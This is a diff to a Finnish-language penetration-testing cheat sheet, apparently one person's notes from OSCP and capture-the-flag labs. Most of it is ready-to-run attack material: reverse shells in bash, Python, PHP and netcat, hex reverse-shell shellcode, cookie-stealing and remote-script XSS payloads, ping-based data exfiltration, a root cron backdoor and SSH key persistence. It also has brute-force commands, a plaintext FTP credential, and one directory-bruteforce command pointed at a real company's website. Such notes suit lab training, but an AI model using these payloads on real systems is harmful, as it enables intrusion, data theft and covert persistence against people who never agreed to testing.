@@ -1,11 +1,36 @@
+https://www.youtube.com/watch?v=_csbKuOlmdE 51min
+https://youtu.be/_csbKuOlmdE?t=3057
+
+brutespray (tällä brute login nmap -oG moniin http,smtp, smb...)
+https://github.com/x90skysn3k/brutespray
+
+jos terminaalissa ei oikein vi toimi, koittaa background shell(ctrl-z) ja ajaa omalla koneella
+$ stty size
+49 198
+$ stty raw -echo
+ja takas shell koneella asettaa ne samoiksi (fg)
+$ stty rows 48 cols 198
+
+CTRL-C toimii myös tuon ylläolevan jälkeen. TEE TOI!
+
 privilege escalation linux
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+netcat without -e
+https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
+
+ftp onnistuu myös wget:llä: toinen on laittaa viela --no-passive jos vaatii active moden
+wget -m ftp://root:BGPtelc0rout1ng@10.120.15.10
 
 crypto solver, kokeilla jos ei vaiks rot13 löydä:
 https://quipqiup.com/
 
 Katso täältä hashet md5 yms
 https://hashes.org/
+
+Tällä voi koittaa löytää keinoja sisään, OSCP:tä varten tehty
+python /opt/Reconnoitre/reconnoitre/reconnoitre.py -h  # helppi jutska
+python /opt/Reconnoitre/reconnoitre/reconnoitre.py -t 10.10.10.37 -o `pwd` --services    #esimerkiksi
 
 täältä löytyy scripti millä saa ajettua gdb ja normaali samoilla env arvoilla(toimii sama exploit gdb:ssä ja ulkona siitä)
 https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966
@@ -14,6 +39,7 @@ interesting stuff:
 https://download.vulnhub.com/media/stapler/slides.pdf
 
 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
 Enumeration stuff:
 http://0daysecurity.com/penetration-testing/enumeration.html
@@ -94,6 +120,9 @@ http://resources.infosecinstitute.com/brainpan_virtual_machine/
 x86 shellcode:
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 
+x86 reverse shell code localhost \x7f\x00\x00\x01  61777  \xf1\x51    (tuolla näiden välissä vain \x66\x68)
+\x90'*8+'\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x00\x00\x01\x66\x68\xf1\x51\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+
 täällä lopussa etsii core dumpista exploitin (se missä tarvittiin encrypted exploit ajaa takas)
 https://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/
 
@@ -139,9 +168,16 @@ curl 192.168.182.141:591/cgi-bin/cat -H "custom:() { ignored; }; echo Content-Ty
 
 
 
-
 netdiscover
 
+Paljon eri listoja username password url etc:
+https://github.com/jhaddix/SecLists.git
+
+gobuster
+gobuster -w /usr/share/wordlists/jhaddix/content_discovery_all.txt -s 200,301,307 -t 100 -u https://www.tesla.com/ 
+
+
+gobuster -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o root-normal.log
 dirb
 Isompi sanalista ja vielä .php perään:
 dirb https://192.168.83.136 /usr/share/wordlists/dirb/big.txt -X .php
@@ -153,7 +189,6 @@ dirb:llä kun tuntuu kestävän:
 wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.10.34/FUZZ
 
 
-
 dirbuster 
 
 wfuzz -c -z file,/usr/share/dirb/wordlists/big.txt --hc 404 http://192.168.182.136:33447/Challenge/FUZZ.php
@@ -163,11 +198,8 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/j.py
 python /tmp/j.py
 
-jos terminaalissa ei oikein vi toimi, koittaa background shell ja ajaa omalla koneella
-stty size
-49 198
-ja takas shell koneella asettaa ne samoiksi
-stty rows 48 cols 198
+bash shell törkätään nc -nlvp 443
+bash -c "bash -i >& /dev/tcp/10.10.13.30/443 0>&1"
 
 oman linux salasanan luonti, voi laittaa /etc/passswd tiedostoon salasanan paikalle: yhdessä boksissa oli rw oikat kaikille tossa
 openssl passwd -l -salt jari salasana
@@ -178,6 +210,11 @@ REVERSE SHELL muista aina tarkistaa oletetut portit!!!! 443, 8080, jne
 /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.182.130",51242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.182.130",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
+phpmyadmin, tällä voi luoda salasanan ja löytää tunnuksen minkä salasanaa ei tiedä:
+php -a
+echo password_hash('jari', PASSWORD_DEFAULT);
+
+ja sitten kopio hashin, phpmyadmin;in kautta tunnukselle
 
 php -r '$sock=fsockopen("192.168.83.128",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
@@ -194,6 +231,8 @@ crack md5 pw's:
 https://crackstation.net/
 
 
+find joka etsii vain tiedostoista, ei /proc /sys etc. ja tuo xargs lopussa etsii löydettyjen tiedostojen sisältä 'password'-stringiä
+find / -xdev -type f -user alabaster_snowball 2>/dev/null | xargs grep password
 
 find world writeable files:
 find / -perm -0002 -type f 2>/dev/null | grep -v "proc"
@@ -231,7 +270,7 @@ hydra 192.168.0.112 http-form-post "/index.php:action=dologin&username=^USER^&pa
 
 
 tää toimi yksinkertaseen formiin:
-hydra 192.168.182.133 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid" -P /mnt/hgfs/temp/rockyou.txt -l root
+hydra 192.168.182.133 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid" -P /mnt/hgfs/Temp/rockyou.txt -l root
 'elite'
 
 http basic authentication:
@@ -241,7 +280,10 @@ hydra ssh password:
 hydra -L usernames.txt -e nsr 192.168.83.130 ssh
 
 helppo hydra www login: sitaatteihin kopioidaan burpista pyyntö, laitetaan vain ^USER^ ja pass paikoilleen ja katotaan failed attempt loppuun
-hydra -l falaraki -P list.txt 10.10.10.14 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^...:is incorrect"F
+hydra -l falaraki -P list.txt 10.10.10.14 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^...:is incorrect"
+
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/10k_most_common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&^PASS^:Invalid" -t 64
+
 
 hydraan voi myös laitaa optiot: -e ns -vV
 tällä näkee miten etenee
@@ -267,6 +309,9 @@ sqlmap --threads=10 --random-agent --url="http://192.168.182.129/login.php" --da
 
 sqli joka toimi:
 ' or 1=1#
+
+sql injection selitetään miten tehdä käsin täällä:
+https://youtu.be/_csbKuOlmdE
 
 tämä NullByte, pelkkä get request ja yksi parametri
 sqlmap -u http://192.168.56.104/kzMb5nVYJw/420search.php?usrtosearch=a
@@ -331,6 +376,8 @@ Command injection, kun vain ping toimii, ajaa id:n ja kertoo tuloksen pinging -c
 ;ls | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.182.130; done
 
 
+command injection keino: tuo ajaa /bin/ls komennon roottina, siihen saadaa lisättyä muita kun tehdään tuo \$()
+supershell "/bin/ls \$(chown root:root /tmp/shell"
 
 sqlmap --threads=10 --random-agent --url="http://192.168.182.138/index.php" --data="param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D"
 
@@ -368,6 +415,10 @@ chmod 600 authorized_keys
 
 ja login tällä: (käyttäjäksi se kenelle authorized_keys laitettiin)
 ssh -i id_rsa delacroix@192.168.182.133
+
+Voi joutua kayttamaan tata, +-merkit vaihdettu url encoodatuiksi %2b (jos joutuu laittamaan php shelliin jossa ?cmd=...)
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCXBbB1pkGF/AMfUGOWWUEdFaB80dqB5p6LJzEfSjdYMhyDNOgxsCuYryD1t%2bG%2ba6g/prLOyLWoOZgobnSqz2IYaH5ap8Vo5tLeietZizZWnTuXAq3IzOapwl0M3COmnBLB8HL%2bQtjqDRKAtxM4KHGcrHNZOdoTY0wfb2CVJJd1pZlaKZlFqGVEMJeuGWs5jUs9uLKHGm3fd1AoxeeDu7YfObTESHeI2Jlc8t/ibzsaRhWac/Qq9VM%2b0nkPU1/vYrCWB2tB2%2bo5DepkXOm2IXFrFg31oJREVD11FFODHXqVPfhfed39BcTaQjrWar9XEA/3qcBhVO/7xsC3c103vaYn" >> authorized_keys
+
 
 jos löytyy PUT option mahdollista upload joku tiedosto, metasploit auxiliary/scanner/http/http_put
 curl http://192.168.182.135/test/ -v -X OPTIONS
@@ -410,6 +461,7 @@ jos käyttää WordPress Plugin Advanced Video 1.0 - Local File Inclusion (https
 Haetut tiedostot tulee tänne:
 https://192.168.83.135:12380/blogblog/wp-content/uploads/
 
+wp-config.php #tuolla salasana/user tietokantaan
 
 kun on admintunnus/salasana hallussa metasploitilla voi ajaa exploitilla meterpreterin:
 use exploit/unix/webapp/wp_admin_shell_upload
@@ -549,6 +601,115 @@ https://www.exploit-db.com/exploits/40616/
 
 luo wordlist:
 cewl -w customwordlist.txt -d 5 -c 7 https://fr.wikipedia.org/wiki/%2850000%29_Quaoar
+
+javascript encoding bypass
+Tässä tapauksessa oli add note toiminto jossa filteröintiä, mutta tällä sai toimimaan
+<img src="x/><script>eval(String.fromCharCode(document.write('<script src="http://10.10.14.13/holiday.js"></script>')));</script">
+toi sisällä oleva 
+***document.write('<script src="http://10.10.14.13/holiday.js"></script>')***
+pitää vielä pythonilla pilkulla eroteltu ord() lista
+for char in ascii:
+  decimal += str(ord(char)) + ','
+return decimal[:-1]    #100,111,99,117...
+
+RSA crypto
+https://youtu.be/_csbKuOlmdE?t=3057
+tuossa videossa ctfrsatool ja käsin saadaan heikosta public rsa avaimesta sen private avain
+
+for windows run this post module for both x86 and x64, combine, if same exploit in both try it first
+migrate to explorer.exe to get to x64 if you start with x86
+post/multi/recon/local_exploit_suggester
+
+jos ajaa meterpreteriä tarkista sysinfo ja käytä x86 meterpreter tai x64 meterpreter riippuen mikä arkkkitehtuuri on käytössä.
+x86 ei välttämättä kaikki exploitit toimi x64 arkkitehtuurissa
+
+Hakea täältä salasanalistoja yms
+https://github.com/danielmiessler/SecLists
+
+bash script jolla voi katsoa kun uusia prosesseja käynnistyy (käytti katsomaan minkä käynnistyi joka minuutti, kun ei nähnyt sitä cronia
+#!/bin/bash
+
+IFS=$'\n'
+
+old = $(ps -eo command)
+while true; do
+  new =$(ps -eo command)
+  diff <(echo "$old") <(echo "$new")
+  sleep 1
+  old=$new
+done
+
+binwalk voi etsiä kuvasta piiloitettua tietoa png jpg gif
+binwalk -Me kuva.png     #ajaa tuon uudestaan ja ottaa ulos tiedostot
+
+hashcat -w 3 -a 0 -m 10500 sala2 /usr/share/wordlists/rockyou.txt --force --show
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.139 80 >/tmp/f
+
+mitään noista en vielä saanut toimimaan:
+<img src=x onerror=this.src='http://10.10.14.237:1234/?c='+document.cookie>
+
+<script src=http://10.10.14.237:1234/malicious-code.js></script>
+%3cscript src=http://10.10.14.237:1234/malicious-code2.js%3e%3c/script%3e
+\x3cscript src=http://10.10.14.237:1234/malicious-code3.js\x3e\x3c/script\x3e
+
+
+
+
+aspx command script: (laitoin myös omaa githubiin)
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+
+
+kun ei ole nc netcat niin saa vastaan otettua tiedoston nc -nlvp  80
+cat < /dev/tcp/10.10.14.3/80 > LinEnum.sh
+
+SSH tunnel kun ei ole ssh käytössä:
+https://github.com/jpillora/chisel
+git clone https://github.com/jpillora/chisel.git
+go build
+
+mutta jos tarvitsee pienemmässä koossa:
+go build -ldflags="-s -w"
+upx -hs chisel
+
+koon voi tarkistaa
+du -hs chisel
+
+chiselin kayttoa tassa videossa: https://youtu.be/Yp4oxoQIBAM?t=1661
+Chisel SOCKS proxyn käyttö: https://youtu.be/Yp4oxoQIBAM?t=5459
+
+kali koneella:
+chisel server -p 8000 -reverse -v
+
+kohde koneella: (Tama aukaisee kalikoneella portin 8001 joka ohjataan 172.19... porttiin 80)
+chisel client kali-ip:8000 R:8001:172.19.0.3:80
+
+chicel SOCKS modessa:
+kali:
+chisel server -p 8000 -reverse -v
+
+kohde kone:
+chisel client kali-ip:8000 R:8001:127.0.0.1:1337
+ja toinen kohde koneella:
+chisel server -p 1337 --socks5
+
+ja vielä kali koneella: (tama aukaisee kalikoneella portin 1080 socks proxyna)
+chisel client 127.0.0.1:8001 socks
+
+
+
+portscan bash script:
+for port in $(seq 1 65535); do
+  (echo Please > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null
+done
+
+curated list of linux binaries that can be exploited
+https://gtfobins.github.io/
+
+jos pääse kirjoittamaan tiedostoja voi saada reverse shellin cron:in kautta.
+vi /etc/cron.d/jarisjell
+* * * * * root nc 127.0.0.1 8989 -e /bin/sh
 
 
 
